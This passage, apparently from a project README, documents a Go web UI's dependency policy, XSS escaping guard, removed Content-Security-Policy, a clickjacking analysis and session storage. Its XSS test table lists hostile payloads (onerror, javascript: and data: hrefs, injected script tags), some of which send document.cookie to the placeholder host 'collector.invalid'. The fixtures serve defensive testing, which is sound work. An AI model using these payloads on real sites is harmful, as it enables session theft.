# `internal/ui` — the browser surface, and the dependency policy that came with it

Read on demand. `AGENTS.md` carries the binding claim in three lines and points here for
everything below.

## What Phase A is, and what it deliberately is not

One page, one authentication chain, one rendering path — enough to prove the wiring, the
rendering, and the gate.

⚠ **THIS PARAGRAPH SAID `cmd/cairn-ui` WAS "deployed by nothing — no manifest in this
repository points a pod at it", AND IT IS RETRACTED.** The second clause is still true and
never supported the first: the manifest lives in the operator's GitOps repository. The image
is published by `.github/workflows/publish-image.yml` and the surface is live on a public
hostname. ⚠ And the heading above is kept only as a record of where this file started — the
package is four pages, a stylesheet route and two sign-in doors past "Phase A", and the
sections below are the accumulated phases rather than a description of one.

🔴 **HOW IT IS PACKAGED IS NOT STATED HERE. ASK:**

```bash
nix eval --raw .#packages.x86_64-linux \
  --apply 's: builtins.concatStringsSep "\n" (builtins.attrNames s)'
```

A sentence here used to state it, and went false when `packages.ui-image` landed. It is
DELETED rather than corrected: a corrected sentence rots on the next packaging change and
the command does not. **PUBLISHED IS NOT DEPLOYED** stays in prose because no command
answers it.

There is **no sign-in**, **no cookie session**, **no share flow** and none of the nine
screens. Those are later phases with their own decisions. What exists is:

| route | what |
|---|---|
| `GET /` | the page, over the scopes this credential may read |
| `GET /healthz` | **not in the ledger** — answered before the chain runs, says only `ok` |

🔴 **There was a second row and it was deleted, because it told an authorised operator
the opposite of the truth.** `GET /` rendered the page *with no store read* and
`GET /entries` did the work. `Page` emits *"No scope is visible to this credential.
That is an authority answer, not an empty store."* for any empty scope slice — and the
handler behind `GET /` handed it `nil` without ever calling `Source.Visible`, so a
credential with authority over every scope was told it had none, in the one sentence
written to distinguish those two cases. One page needs one route, and the route that
renders it asks. `TestEveryContentRouteConsultsTheAuthority` walks the ledger and
requires every declared route to consult the authority before rendering; it is a
regression test, not an invariant guard — measured RED on the pre-change dispatch
table with the message *"GET / rendered a page WITHOUT consulting the authority"*.

Authentication is a bearer token against the same `internal/control` projection the pod
resolves against. That is enough to exercise the chain without building the session flow,
and it is the reason the identity pin below is meaningful rather than notional.

## 🔴 The first third-party dependency, and the guarantee it removed

🔴 **The canonical statement of what was lost and what replaced it is
`internal/depspolicy`'s package doc, and it is not repeated here.** That paragraph stood in
`go.mod`, `flake.nix`, `internal/ui/doc.go`, this file, `AGENTS.md` and the package doc
itself — six sites; the package doc is now the only one that states it, and the other five
point. Read it there, including the two things this section used to under-claim and
over-claim respectively:

- the replacement is stronger than "a test instead of a build failure" sounds — all three
  Go derivations run these tests in `doCheck`, so an import-ban failure **is** a build
  failure for anyone building through nix;
- and it is weaker in one way no phrasing removes — a build refusal cannot be satisfied by
  deleting a file, and this one can. The `ok` floor in the `go` CI job is what notices a
  package's tests disappearing, and it does not notice one function disappearing.

**Both halves measured, AT A TREE OF SEVENTEEN TEST PACKAGES** — the floor is now `-lt 19`.
**Two** packages have been added since this battery ran, independently and on different
branches: `cmd/cairn-ui` with the share flow's startup refusals, and `internal/envalias`
with the `CAIRN_*` ledger. ⚠ Each of those branches measured EIGHTEEN correctly for its own
tree; nineteen is a fact about the merge and about neither side, which is why the floor was
re-measured there rather than carried forward from either. The numbers below are a RECORD OF
THAT RUN and are not re-derived here — nobody has re-run this battery at nineteen, and
re-spelling a number is not re-measuring it. What survives the count moving is the shape,
which is the row that matters, and the dependency: the RED holds only while floor == count.

| tree | `nix build .#cairn-go` | `ok` lines in its check phase | the `go` job's floor as it then stood (`-lt 17`) |
|---|---|---|---|
| unmutated | rc 0 | 17 — the count | GREEN |
| `internal/report` given `_ "maragu.dev/gomponents"` | **rc 1**, `THE IMPORT BAN FAILED for …/cmd/cairn: … internal/report -> maragu.dev/gomponents` | — | — |
| the same import, **and `depspolicy_test.go` deleted** | **rc 0** — the HTML library is linked into the installed CLI and nix builds it | 16 — one below | **RED** |

🔴 **The third row goes RED only while the floor EQUALS the package count**, and that is
the fragile part rather than an aside. `-lt <count>` refuses the deletion; `-lt <count-1>`
buys exactly one free deletion, which is the only deletion anybody would make. The floor
has been left one behind twice — once inherited, once on the `CAIRN_*` rename branch that
added `internal/envalias` — so the arithmetic is written out beside the number in
`.github/workflows/ci.yml` and this row depends on it.

The third row is the whole weakness in one line: the policy is deletable where
`vendorHash = null` was not, and the only mechanism that observes the deletion is a
package count in one CI job.

`internal/ui` renders HTML with `maragu.dev/gomponents`. There is **one** module, so the
requirement is carried by the pod's and the CLI's derivations too, and all three now pass a
real `vendorHash`. That cost was accepted explicitly — a second module for the UI would
split `internal/` in two and put a version skew between the renderer the pod links and the
one the CLI links, which is the exact failure `internal/report` being ONE package exists to
prevent.

What follows is the evidence for each part: the comparisons, the controls, and the mutants
each was watched to fail on. Records of rounds, which is why they are here and not in a
source comment.

### (i) The module allowlist — `TestTheModuleSetIsExactlyTheAllowlist`

`depspolicy.DeclaredModules` is the whole permitted set. The test reads the set the
repository actually carries — parsing `go.mod`'s `require` directives and `go.sum`'s hash
lines with two independent readers — and compares three ways:

- `go.sum` against `go.mod`, which catches the two lock files being edited apart;
- **GROWN**: a required module the allowlist does not name;
- **SHRANK**: an allowlist entry with no module behind it.

Each direction has its **own message**. A single `reflect.DeepEqual` fails in both
directions and says only "not equal", which is the same defect one level up: the reader
cannot tell which way the set moved, and the natural fix is to edit the allowlist to
match — which is exactly what the guard exists to stop somebody doing without deciding.

The instrument is validated before its verdict is read: an empty allowlist and an empty
measured set both `t.Fatal`, because two empty sets compare equal and a parser wired to
nothing produces one of them.

**Proven red, both directions, each mutant confirmed to BUILD first:**

| mutant | build | result |
|---|---|---|
| `go get golang.org/x/text` (a real, resolvable extra module) | rc 0 | `THE MODULE SET GREW: 1 module(s) are required that the allowlist does not name: [golang.org/x/text]` — and nothing else fired |
| an allowlist entry for a module nothing requires | rc 0 | `THE MODULE SET SHRANK: the allowlist names 1 module(s) go.mod does not require: […]` — and nothing else fired |

### 🔴 There is no `go mod verify` step, and the deletion is the finding

A `go mod verify` step stood in the `go` job as "part (ii)", under a long block of
comment arguing what it did and did not catch. **It verified the empty set.** `cache: false` on
that job's `actions/setup-go` means it starts with no module cache, `go mod verify` does
not download, and it stood ahead of the `go vet` step — so it ran against a cache nothing
had yet populated and printed the identical success line over zero modules. Measured on go1.26.7 against isolated
`GOMODCACHE`s, `rc` captured before any pipe:

| state | rc | stdout | modules extracted in the cache |
|---|---|---|---|
| **cold — the state CI actually ran it in** | **0** | `all modules verified` | **0** |
| populated (positive control) | 0 | `all modules verified` | 1 |
| populated + a line appended inside the module dir (negative control) | **1** | `maragu.dev/gomponents v1.3.0: dir has been modified` | 1 |

Moving it below `go test` would not have rescued it. The only hazard it can see is a cache
modified **after** its fetch; this job fetches into a cache no earlier step restored, and
nothing between the fetch and the check writes to it. In its new position it would be
green-by-construction too — a gate nobody can fail.

It also never gated the hazard its name suggests. With `go.sum`'s `h1:` line corrupted it
exits **0** with `all modules verified` in **both** cache states. What refuses that tree is
the build, which the `go vet` and `go test` steps already run (measured with
`go build ./...` over an isolated cache; whether a `nix build` refuses it with the same
words is **not** measured):

| tamper | `go mod verify` | `go build ./...` |
|---|---|---|
| a character changed in `go.sum`'s `h1:` line | **rc 0**, `all modules verified` (cold **and** populated) | **rc 1**, `verifying maragu.dev/gomponents@v1.3.0: checksum mismatch` → `SECURITY ERROR / This download does NOT match an earlier download recorded in go.sum` |

`TestGoModVerifyPassesIsNotThisSuitesJob` went with it. Its docstring claimed it kept the
step from becoming a gate over an empty set; its body asserted that **`go.sum` names ≥1
module**, which is the wrong quantity — a non-empty `go.sum` does not make the module cache
non-empty, and the cold cache above is the proof. A guard whose description is wider than
its body reads as coverage while providing none, which is worse than none.

### (ii) 🔴 The import ban — the one that keeps the pod clean

`TestNoPackageTheCLIOrThePodLINKSReachesAThirdPartyModule` builds the import graph of
every package under `cmd/` and `internal/` with `go/build` — **parsed, not grepped**, so
an import behind an alias is seen and a module name in a comment is not — computes the
transitive closure out of `cmd/cairn` and `cmd/cairn-server`, and refuses any third-party
import edge inside either.

The allowlist alone cannot do this job: an allowlist of one entry is satisfied by a tree
in which `internal/api` imports that entry on every route.

Three controls run before its verdict is read:

1. **Positive control** — `cmd/cairn-ui`'s closure MUST contain a third-party edge. A walk
   that cannot see the one dependency this repository has cannot vouch for the absence of
   any other, so a zero there withholds the result rather than reporting it clean.
2. **Depth control** — each root's closure must contain a module-internal package that is
   not one of that root's own imports. It is *computed*, not a named package: the first
   draft named `internal/store`, which `cmd/cairn-server` imports **directly**, so the
   control would have been satisfied by exactly the depth-1 walk it existed to refuse.
3. **Platform control** — `go/build`'s default context evaluates `//go:build` lines for the
   current `GOOS`/`GOARCH`, so an import reached only on another platform would be
   invisible. `TestTheImportGraphDoesNotDependOnTheBuILDPLATFORM` re-walks with constraint
   evaluation disabled and requires the same import set. If it ever fails, the ban has a
   hole and the ban is what needs widening.

Test-only imports are excluded from the graph: a `_test.go` file is compiled into a test
binary and never into the program, so counting it would refuse a test that imports a
third-party assertion library — a refusal about nothing, which is how a gate gets deleted.

**Measured on this tree, reported as a pair and never as a bare zero:**

| root | packages in closure | third-party edges |
|---|---|---|
| `cmd/cairn` | 32 | **0** |
| `cmd/cairn-server` | 56 | **0** |
| `cmd/cairn-ui` (positive control) | 52 | **3** |

**Proven red:**

| mutant | build | result |
|---|---|---|
| `internal/report` gains `_ "maragu.dev/gomponents"` | rc 0 | `THE IMPORT BAN FAILED for …/cmd/cairn` **and** `…/cmd/cairn-server`, each naming the edge `internal/report -> maragu.dev/gomponents` |
| `UIBinaryRoot` repointed at a clean binary | rc 0 | `POSITIVE CONTROL FAILED: …/cmd/cairn reaches NO third-party import` |
| `Closure` stops descending after depth 1 | rc 0 | `DEPTH CONTROL FAILED: every module-internal package in …/cmd/cairn's closure is one of its OWN imports` |

**And the claim measured on the artefacts themselves**, which is what the ban is a proxy
for — `go tool nm` over the three binaries: `cairn` **0** gomponents symbols,
`cairn-server` **0**, `cairn-ui` **75**; and `go version -m` records
`dep maragu.dev/gomponents v1.3.0` in `cairn-ui` alone.

### (iii) The prose

`go.mod`'s header and `flake.nix`'s `vendorHash` comment both **stated** the old
guarantee. Both now quote the sentence they replaced rather than deleting it, so a
maintainer who remembers the property is told where it went instead of inferring that
nothing took its place — and both then **point** at `internal/depspolicy`'s package doc
rather than restating what replaced it. That restatement stood in six places at once;
`one rule, one place` applies to prose that is a claim, and six copies of a claim are six
chances for five of them to go stale while still reading as authoritative.

⚠ A vendor hash is **not** a dependency gate and must not be read as one. It pins the
bytes of whatever the module graph resolves to; it says nothing about which modules are in
that graph, and adding one just changes the hash.

## 🔴 The XSS guard

This is the first surface in cairn's history that renders arbitrary user text into HTML.

**Measured against gomponents v1.3.0's own source, not assumed:** `Text`/`Textf` and the
*value* half of `Attr` all run `template.HTMLEscapeString`, so text content and a quoted
attribute value are safe against breakout. Two things are **not** covered, and both are
reachable here:

- **A URL scheme.** `html/template` rewrites a `javascript:` href to `#ZgotmplZ`;
  gomponents writes it through unchanged, because `template.HTMLEscapeString` has nothing
  to say about a scheme — every character of `javascript:alert(1)` survives escaping
  intact. A store entry's `tasks:` ref is `<system>:<id>`, which is *exactly* the shape of
  a scheme plus an opaque part, so this is reachable input and not a constructed one.
- **An element or attribute NAME.** `El` and the name half of `Attr` are written verbatim,
  so a name built from user text is a breakout the value escaping structurally cannot see.

Three mechanisms answer those, and each is checked by a test rather than asked for by a
comment.

### `safeHref` allowlists schemes

`http://` and `https://`, and nothing else. A denylist is the wrong shape: the set of
schemes a browser will execute is open, so a list of the ones to refuse is wrong the
moment it is written. A ref that does not pass renders as **plain text** — visible, inert,
and not silently dropped; dropping it would hide a fact the file carries, and
`<a href="">` would put a clickable element on the page whose target the reader cannot see.

⚠ **The case-fold and the whitespace strip protect the PERMIT side, not the refuse side**,
and an earlier comment here said the opposite. Measured with mutants: deleting the
`ToLower` makes `HTTPS://tracker.invalid/…` be **refused** and changes nothing about
`JaVaScRiPt:`, which an allowlist rejects at any casing. Deleting the strip refuses
`  https://…`. Neither is what stops the script-scheme attack — the allowlist is. What
they buy is that a correctly-spelled URL is not silently demoted to plain text, and that
the value written into the href is the stripped one, so what the page shows and what the
browser resolves are the same string.

### The raw-node ban — `TestNoRawNodeConstructorAppearsInTheUIPackage`

An AST scan, not a grep: it resolves each file's **import alias** for the gomponents
module and matches selector expressions against it, so `g.Raw` is seen (a text search for
`gomponents.Raw` finds nothing that exists) and an unrelated method named `Raw` is not.

It refuses `Raw`, `Rawf`, a dot-import of the module, and `El`/`Attr` called with a
non-constant name argument. It covers `_test.go` files too — a test that renders with
`g.Raw` and asserts a comfortable output is exactly how a rendering guard gets walked.

It reports a pair: the number of gomponents calls it **inspected** must be non-zero, or a
scanner that resolved no alias reports a clean zero indistinguishable from a pass. On this
tree: 9 files scanned, 48 calls inspected, 0 findings.

⚠ **One conservative gap, stated rather than hidden:** a bare identifier is accepted as a
name argument without proving it is a `const`, because proving that needs the type checker
and this ban runs without one. So `g.Attr(someVariable, v)` is **not** caught. What is
caught is every shape that could carry user text directly — a call, an index, a selector,
a conversion — which is where such a name actually comes from.

**Proven red — six mutant shapes, each asserted to fail with its OWN message**, because a
mutant killed by a different arm proves the scanner can produce output and proves nothing
about the rule the arm exists for: `g.Raw`, `g.Rawf`, `gom.Raw` (a different alias),
`g.El(e.Ref)`, `g.Attr(e.Ref, …)`, and a dot-import. Plus the mirror: a clean source using
`g.Attr(refAttr, …)`, `g.El("span", …)` and `g.Textf` must produce **zero** findings, or
the ban refuses all rendering rather than unescaped rendering.

### The rendering test — `TestHostileEntryTextIsEscaped`

**Realistic hostile fixtures, not textbook ones.** `<script>alert(1)</script>` is what
every escaper's own test suite already covers, and it exercises exactly one context. Each
fixture below breaks out of a **different** position and does something an attacker would
actually want. All are synthetic; `collector.invalid` and `tracker.invalid` are in the
IANA-reserved `.invalid` TLD and resolve nowhere.

| position | input |
|---|---|
| text content | `Rollout notes</span><img src=x onerror="fetch('//collector.invalid/c?'+document.cookie)">` |
| attribute value | `runbook" onmouseover="fetch('//collector.invalid/c?'+document.cookie)" data-x="` |
| unclosed tag | `<div style="position:fixed;inset:0;z-index:2147483647;background:#fff" onclick="` |
| href | `javascript:fetch('//collector.invalid/c?'+document.cookie)` |
| href, case-varied + tab | `\t JaVaScRiPt:void(document.title=document.cookie)` |
| href | `data:text/html;base64,PHNjcmlwdD5mZXRjaCgnLy9jb2xsZWN0b3IuaW52YWxpZC8nKTwvc2NyaXB0Pg==` |
| a scope heading | `platform</h2><script src="//collector.invalid/x.js"></script><h2>` |

The entry's ref is rendered into **both** a `title` attribute and text content, so both of
gomponents' escaping paths are exercised rather than one.

Three assertions, in increasing strength:

1. **A structural differential.** A benign world of the *same shape* — one scope, one
   entry, one alias, three refused refs and one link — must produce a page with an
   identical markup shape: the counts of `<`, `>` and `="`. Escaping's whole claim is that
   the page's shape does not depend on its content, and this needs no list of attack
   strings, so it is blind to nothing a future payload invents. Measured: hostile
   `{lt:49 gt:49 eqQuote:17}` == benign `{lt:49 gt:49 eqQuote:17}`.
2. **A token scan**, over four substrings this renderer never emits: `<img`, `<script`,
   `href="javascript:`, `href="data:`. The positive control feeds it the raw fixtures and
   requires the count to move — reported as the pair `4 in the raw fixtures, 0 in the
   rendered page`, never as the zero alone.
   ⚠ An earlier draft of this list also held `onerror=`, `onmouseover=`, `</span>` and
   `</h2>`, and **every one of those fired on a correctly escaped page**: `</span>` and
   `</h2>` are the page's own structure, and `onerror=&#34;…` is the escaped, inert
   rendition — `=` is not an escapable character, so a substring test cannot tell live
   markup from escaped text. A guard that fires on a safe page is a guard that gets
   deleted.
3. **The whole normalised escaped string**, pinned as a literal for four of the fixtures —
   a guard on *words* is walkable by rewording. The literals are hand-written from the HTML
   escaping rules rather than produced by `template.HTMLEscapeString`, so the expectation
   is not derived from the implementation it tests.

Plus: each refused ref must appear as **text** and must not appear after `href="`; and the
one benign `https://` ref **must** render as a link, or every "no `href=javascript`"
assertion above is satisfied by a page with no links at all.

**Proven red:**

| mutant | build | result |
|---|---|---|
| the entry title renders through `g.Raw` | rc 0 | the structural differential moves to `{lt:51 gt:51 eqQuote:18}`, `<img` appears once, the escaped-literal pin misses — **and** the raw-node ban names `render.go:60: calls g.Raw` |
| `safeHref` returns `(raw, true)` for everything | rc 0 | `href="javascript:` ×2 and `href="data:` ×1 in the page, both refused-ref assertions fire, and `TestSafeHrefAllowlistsSchemes` reports nine specific permits |
| the `ToLower` is deleted | rc 0 | `safeHref refused a permitted URL "HTTPS://tracker.invalid/issue/1"` |
| the whitespace/C0 strip is deleted | rc 0 | `safeHref refused a permitted URL "  https://tracker.invalid/issue/1  "` |

### Response hardening: one header, and a policy that was DELETED on purpose

`X-Content-Type-Options: nosniff`. That is the whole list. The escaping is the guard; that
header is behind it.

🔴 **THE CONTENT-SECURITY-POLICY IS GONE, BY OPERATOR DECISION — challenged once with the
blast radius below and reaffirmed.** It was
`default-src 'none'; style-src 'self'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'`.
`TestTheHTMLResponseSendsNoContentSecurityPolicy` pins the absence on both HTML shapes and on
the report-only spelling, so restoring the header is a decision somebody takes in that test
rather than a line that reappears in a merge.

**What was given up, named rather than left to be reconstructed:**

| clause removed | what it had been stopping |
|---|---|
| `frame-ancestors 'none'` | the surface is FRAMABLE — full clickjacking of the share flow's state-changing POSTs, with both cross-site gates satisfied; see below |
| `form-action 'self'` | an injected form can be induced to POST offsite |
| `base-uri 'none'` | an injected `<base href>` re-points every relative URL on the page |
| `default-src 'none'` | arbitrary script and third-party origins become loadable |

### 🔴 The framing row — and a RETRACTION of this section's own previous correction

⚠ **THIS SECTION HAS BEEN WRONG ONCE IN EACH DIRECTION, AND THE SECOND TIME WAS THE UNSAFE
ONE. It is the load-bearing description of an operator decision that was reaffirmed on it, so
both drafts are quoted rather than reworded away.**

The **original** text said: *"A clickjacked submit originates INSIDE the page: its `Origin`
really is this origin and the CSRF token rendered into it really is the victim's, so gate (2)
and gate (6) both pass. Framing was never something those gates could see; refusing to be
framed was the only defence and it is now absent."*

The **second** draft called that wrong, on the grounds that `identity.SessionCookie` sets
`SameSite=Lax` so a framed load carries no cookie and renders the sign-in page, and concluded
the exposure was *"SMALLER than recorded"*. **That second draft is retracted. The original
stands.**

🔴 **`SameSite` IS SITE-SCOPED; `frame-ancestors` WAS ORIGIN-SCOPED.** They are not the same
boundary and the retracted draft conflated them. "Same site" is the **registrable domain**.
`session.go`'s own comment says so, and the retracted draft cited that very comment while
stopping one clause short of the words that refute it — quoted here **in full**:

> `Lax` is NOT treated as the CSRF guard — it is a browser-side property this server cannot
> verify, **and "same site" still includes a sibling subdomain**. The guard is the token.

So a framer at **any host sharing this deployment's registrable domain is same-site**. Lax
attaches `__Host-cairn-session` to that framed load — the `__Host-` prefix stops a sibling
*setting* the cookie and has nothing to do with how the site is computed. The framed document
renders **authenticated**, with a real `csrfTokenFor` token in it; the induced click submits
with `Origin` genuinely equal to this origin; `sameOrigin` passes and the token matches. The
originally recorded mechanism follows **in full**. `internal/identity/session.go` already
models a hostile sibling host under the registrable domain as a real attacker against this
exact cookie — it is the same attacker.

**The live cases, worst first:**

| case | what happens |
|---|---|
| **a SAME-SITE framer** — any host under this deployment's registrable domain | full clickjacking of the share flow's grant and revoke POSTs, **both gates satisfied**, exactly as the original text said. ⚠ Whether such a host exists is a property of the **deployment** — what else is served under that domain — which this repository cannot see and must not assume away |
| **a cross-site framer in a client that does not enforce Lax** | same mechanism, restored in full, and nothing here would know |
| **UI redress against the unauthenticated sign-in page** | needs no cookie at all, so it frames from **any** origin; a framed sign-in form under an attacker's chrome is a phishing surface, and no gate addresses it because every request involved is legitimate |
| **any route a later change makes reachable without a session** | inherits the row above, with nothing going red — the standing cost of having no `frame-ancestors` |

What `SameSite=Lax` actually buys is the **narrower** case only: a framer at a *different*
registrable domain. That is worth having and it is not what the retracted draft claimed.

🔴 **AND THE EVIDENCE CLASS, WHICH DID NOT IMPROVE ACROSS EITHER DRAFT.** All of this is
**derived** — from the cookie constructor, and from `SameSite`/`frame-ancestors` scoping rules.
**No test in this tree and no browser run has framed this surface or observed which requests
carry the cookie.** `session.go` flags its neighbouring `Secure`-on-`localhost` claim as
unmeasured for the same reason. The lesson the retraction leaves is the point: the wrong draft
was *also* derived, *also* read plausibly, and was unsafe — derivation is not a substitute for
measuring it.

🔴 **AND THE GATES THEMSELVES ARE UNTOUCHED, WHICH IS A DIFFERENT SENTENCE FROM THE ONE ABOVE.**
`sameOrigin` and `csrfTokenFor` are derived from the request method by `stateChanging`, they
read no header `writeHTML` sets, and `session_test.go` measures them. So are the `__Host-`
cookie attributes and the sign-in lockout. Reading "the CSP is gone" as "cross-site protection
is gone" is the mistake this paragraph exists to stop.

⚠ **ONE THING THE DELETION DID NOT BUY, BECAUSE THE OPPOSITE IS THE OBVIOUS GUESS:** the policy
was never what blocked Tailwind. `style-src 'self'` permits a compiled same-origin stylesheet —
which is precisely how the stylesheet was served *under* that policy, from `/static/app.css`.
The absent build step was the blocker; it is now present (`tailwind.css` → `app.css`, gated by
`checks.ui-stylesheet-is-current`). The header deletion removed a control and additionally
unblocked the Tailwind Play CDN, which Tailwind documents as not for production and which this
surface does **not** use.

⚠ **THE PARAGRAPH THIS SECTION REPLACED WAS WRONG ABOUT THE POLICY IT DESCRIBED, TWICE, and the
record is kept because it is the reason to distrust a prose restatement of a header.** It read
*"a CSP of `default-src 'none'; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'`
— no script permitted at all."* The `form-action 'none'` half had been **stale since Phase B**,
when the constant moved to `'self'` so the forms would work — so this README asserted a stricter
policy than the code shipped, for two phases, in the section whose whole job is to state what
the response promises. The lesson outlives the header: a policy written in prose drifts from the
policy on the wire, which is why what remains here is a table of what was REMOVED and a test
name, not a string anybody has to keep in step.

## 🔴 `TrustedHeader` is not in this binary's identity chain

`internal/identity/README.md` states the hazard plainly: on a pod that is reachable
directly, that backend lets anyone who can open a socket **be** any user in the control
plane, at that user's full authority, on every route, with the writes attributed to them.
The pod's defence is an operator's explicit proxy-fronted declaration plus a source check
— a property of the **deployment**.

A browser surface cannot carry that trade, because its whole purpose is to be publicly
reachable. So `ui.AuthBackends` has **no `*identity.TrustedHeader` parameter at all** where
`identity.Backends` does, and `cmd/cairn-ui` never calls `identity.FromEnvironment` (which
arms the backend from the environment). The backend is unreachable here by construction
rather than refused by configuration, which is the stronger claim: a configuration refusal
can be reconfigured.

⚠ **This sentence deliberately carries NO parameter COUNT.** It read *"takes two backends
where `identity.Backends` takes three"* while `AuthBackends` took **one**, and refreshing
that number would have been *wrong on merge with no textual conflict to warn anybody*: the
branch adding cookie sessions moves `AuthBackends` to two parameters and `identity.Backends`
to four, and does not touch this line. The ABSENCE of one named parameter is the property,
and it is what `TestTheUIChainHasNoTrustedHeaderMember` grades — on the chain the function
RETURNS, not on its signature.

⚠ **The signature is the mechanism; the signature alone is not the guard.** Nothing stops
a future caller building an `identity.Chain` literal and appending one.
`TestTheUIChainHasNoTrustedHeaderMember` inspects the chain `AuthBackends` **returns** —
the state, not the spelling — with a live `*identity.TrustedHeader` available to it, and
carries its positive control in the same function: that same value is passed to
`identity.Backends`, where it **must** appear, or the type assertion is broken and its
absence from the UI chain means nothing. Measured: `1 in the identity.Backends control
chain (2 members), 0 in the UI chain (1 members)`.

**Proven red — and the first mutant SURVIVED, which is worth more than the kill:**

| mutant | result |
|---|---|
| `AuthBackends` forwards a `TrustedHeader` built with `Secret: []byte("mutant")` | **SURVIVED.** The secret is 6 bytes against `identity.MinProxySecretBytes = 32`, so `NewTrustedHeader` refused, `trusted` was a nil `*TrustedHeader`, `identity.Backends` skipped it, and the test passed against a mutant that armed **nothing**. A mutant that evaluates to a no-op proves nothing, and it looks exactly like a kill that did not happen. |
| the same, with a 33-byte secret and the construction error surfaced | **KILLED**, with its own message: `THE UI CHAIN CONTAINS 1 *identity.TrustedHeader MEMBER(S)…` |
| the membership check asserts `*SupabaseJWT` instead | **KILLED** on the control arm: `POSITIVE CONTROL FAILED: identity.Backends was handed a live *identity.TrustedHeader and the membership check found none…` |

## The route ledger

`ui.DeclaredRoutes()` derives from the same `routes` map the dispatcher reads — there is
no second copy to disagree with. It is read by **one** guard,
`TestTheRouteLedgerMatchesTheDispatchTable`, which runs in `mkGoUI`'s own check phase, so
`nix build .#cairn-ui` gates it.

🔴 **Three mechanisms pinned this list and two were removed, which is a decision and not
an oversight.** A draft carried the Go test *plus* `checks.go-ui-declares-its-routes`
(running the binary and diffing its `-routes` output against a third hand-written copy)
*plus* a `nix` CI step naming that check — three mechanisms over a **one-row** hand-written
list. The `-routes` flag went with them: its only reader was the check, and a flag with no
caller is the shape this repository refuses elsewhere as exported API with no consumer.

⚠ **The pod's equivalent is kept, and the asymmetry is the reason.** `api.DeclaredRoutes()`
is checked against `tests/conformance/requests.json` — an external corpus saying what the
world expects — and the corpus builder is **Python**, structurally blind to a compiled
binary, so `cairn-server -routes` is a genuinely second instrument in a second environment.
This surface has neither a corpus nor a Python-side gate; printing the list from the binary
restates one claim down a longer path. The strongest available claim here is that the
ledger and the dispatcher read one map and that the expected set is spelled out once by
hand: a grow-or-shrink guard on a hand-written list, not a contract comparison. When a
later phase gives this surface a corpus, the second tier comes back with it.

⚠ **The two ledgers are separate and neither moves the other.** `GET /` here is a page;
`GET /` on the pod is the byte-pinned uniform 401 in
`tests/conformance/golden/root-path.json`. This change touches neither — verified by
content hash against the base commit, not by ancestry:

```
UNCHANGED  internal/api/routes.go                     be64d465830e94d8…
UNCHANGED  tests/conformance/requests.json            7eece95fc6603e83…
UNCHANGED  tests/conformance/golden/root-path.json    8a715a7fbafda493…
```

## What this surface's tests structurally cannot see

- **A real browser.** Every escaping assertion is over rendered bytes. No test here parses
  the output the way a browser's tokenizer does, so a payload that survives HTML escaping
  and is still executed by a real parser quirk would pass. The structural differential is
  the closest thing to a parse and it is a count, not a tree.
- **The `nix` build's check phase pins dimensions.** `mkGoUI`'s `go test ./...` runs in a
  sandbox with no store, no token, no network and no `HOME` with a cache root. Every guard
  here is over in-process fixtures for that reason; nothing in this package has been
  measured against a real store on disk, a real token file, or a real socket.
- **Concurrency.** Nothing runs two requests at the same instant.
- **A revoked credential.** This binary has no SIGHUP reload path, so a revocation takes a
  restart. That is a real operational difference from the pod and not something to assume
  away from the shared `control.Cache` type.

---

# Phase B — cookie sessions, CSRF, logout and expiry

## 🔴 The storage decision, and the three shapes it beat

The operator chose cookie sessions **over a client-held JWT**, and stated **two** requirements
rather than one. **(i) logout actually revokes** — a JWT is valid until its `exp` and nothing can
take it back. **(ii) sessions survive a process restart and a rolling deploy**, claimed on its own
authority and *not* derived from (i): the requirement is **"a rolling deploy signs NOBODY out"**,
with a brief 503 while a replica restarts being acceptable where a sign-out is not. Both priced the
four options. The canonical statement of all of this is `internal/identity/session.go`'s package
comment; this table is the echo.

| option | verdict | why |
|---|---|---|
| **(a) a file-backed store shaped like `control.FileStore`** | **CHOSEN** | durable across restart, revocable in one write, reuses mechanics this repo has already measured: exclusive `flock`, re-read UNDER the lock, `Sync` before success |
| (b) sessions as events in the control journal | rejected | 🔴 **the performance reason this row led with was FALSE and is corrected, not softened.** It said the replay runs on every call "and every authenticated request calls it"; the second clause is wrong — every serving path reads through a `control.Cache`, so the replay is once per 30s refresh, and `cairn-ui` wires no `FileStore` at all. The reasons that hold: a cached authority makes logout **eventual** (up to one refresh interval), and bypassing the cache to make it immediate is what *would* reinstate replay-per-request; the journal's volume is **ReadWriteOnce on a node-local class**, so sessions in it pin every UI replica to one node — multi-replica dies by construction; and the category objection survives both — the journal answers "who could see this, and when", and an operator reading it for a grant history would be reading it through session noise. Full statement: `internal/identity/session.go`, option (b) |
| (c) a signed stateless cookie plus a revocation list | rejected | it is (a) with extra parts. The revocation list is a durable store that must survive restart or logout is a lie, so nothing is saved; it adds a signing key, which is a new secret with a new rotation story; and entries must be kept until each revoked token's `exp`, so it is a store that can only GROW. A session id is already an unguessable 256-bit value — signing it proves nothing the lookup does not |
| (d) in-memory only | rejected | every restart signs everybody out, which on a rolling deploy is not rare. And it is a **new kind** of multi-replica failure rather than a worse version of the declared one |

⚠ **On (d) and `internal/control/README.md`'s "two pods over one journal" blind spot, precisely.**
That blind spot is *divergence about one durable truth* — two caches at different epochs, which
converges. An in-memory session table has no shared truth to converge on: a session opened on pod
A does not exist on pod B and never will, so a load balancer without sticky sessions signs the user
out on a random fraction of requests. (d) makes the declared blind spot worse **in that sense**.

🔴 **And the honest half, said operationally rather than gently: `cairn-ui` is a SINGLE-REPLICA
surface today.** (a) does not FIX replication — it inherits exactly the journal's shared-filesystem
assumption, no more and no less, and it ends where the journal's does, at the second
`control.Store` implementation. **A second replica without shared storage is not a degraded version
of this design; it is a surface that signs users out on a random fraction of requests** — the same
failure the table above rejects (d) for. And "share the filesystem" is visibly not a configuration
away: the journal's volume is **ReadWriteOnce on a node-local storage class**, so a shared session
file pins every replica to one node.

⚠ **The direction, recorded as a direction and not as a commitment.** Requirement (ii) is met on
one replica because the volume outlives the process. For more than one, the intended answer is
**sticky routing — a StatefulSet with a per-ordinal volume**, each replica owning its own session
table and returning to it after a restart. No Go change; stdlib-only intact. **Multi-replica
sessions is its own arc**, and it is where the cross-replica storage decision gets made — including
`FileSessionStore.Revoke`'s cost, which runs the full `mutate` (`flock`, whole-file re-read,
rewrite, two `Sync`s) even for a digest that is ABSENT: no privilege is gained by a caller who
already holds a bearer credential, but over shared storage it is a lock-contention amplifier.

### Where it diverges from `control.FileStore`, and why

`FileSessionStore` **rewrites** where the journal **appends**. The journal is append-only because
the authority it holds is; a session table's whole content is the set of sessions live *right now*.
Appending would mean a file growing without bound at login rate, a replay getting slower forever,
